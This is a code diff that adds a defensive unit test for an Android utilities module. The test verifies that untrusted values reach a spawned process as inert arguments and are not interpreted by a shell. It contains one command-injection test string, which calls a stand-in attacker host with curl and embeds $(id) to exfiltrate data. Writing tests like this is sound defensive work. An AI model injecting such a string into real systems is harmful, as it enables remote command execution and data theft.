@@ -7,6 +7,7 @@
 import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
+import { EventEmitter } from 'node:events';
 import { TestContext } from '@salesforce/core/testSetup';
 import { stubMethod } from '@salesforce/ts-sinon';
 import { expect } from 'chai';
@@ -474,6 +475,34 @@ describe('Android utils', () => {
         stubMethod($$.SANDBOX, fs, 'existsSync').returns(true);
         const sdkRoot = AndroidUtils.getAndroidSdkRoot();
         expect(sdkRoot?.rootLocation).to.be.equal(mockAndroidHome);
+    });
+
+    it('createNewVirtualDevice passes untrusted values as inert argv elements (no shell)', async () => {
+        // A fake child process whose stdout immediately emits data so the promise resolves.
+        const fakeChild = new EventEmitter() as EventEmitter & {
+            stdin: { setDefaultEncoding: () => void; write: () => void };
+            stdout: EventEmitter;
+            stderr: EventEmitter;
+        };
+        fakeChild.stdin = { setDefaultEncoding: () => {}, write: () => {} };
+        fakeChild.stdout = new EventEmitter();
+        fakeChild.stderr = new EventEmitter();
+
+        const spawnChildStub = stubMethod($$.SANDBOX, AndroidUtils, 'spawnChild').returns(fakeChild);
+        // updateEmulatorConfig runs after creation; short-circuit it.
+        stubMethod($$.SANDBOX, AndroidUtils, 'updateEmulatorConfig').resolves();
+
+        setTimeout(() => fakeChild.stdout.emit('data', 'ok'), 10);
+
+        const malicious = 'evil; curl http://attacker/$(id); #';
+        await AndroidUtils.createNewVirtualDevice(malicious, 'google_apis', 'android-33', 'pixel', 'x86_64');
+
+        expect(spawnChildStub.calledOnce).to.be.true;
+        const [, args] = spawnChildStub.getCall(0).args as [string, string[]];
+        // Blanks are replaced with underscores, but metacharacters must survive intact and be
+        // carried as a single argv element (never split or interpreted by a shell).
+        expect(args).to.include(malicious.replace(/ /gi, '_'));
+        expect(args).to.include('system-images;android-33;google_apis;x86_64');
     });
 
     it('Gets the latest version of cmdline tools', async () => {
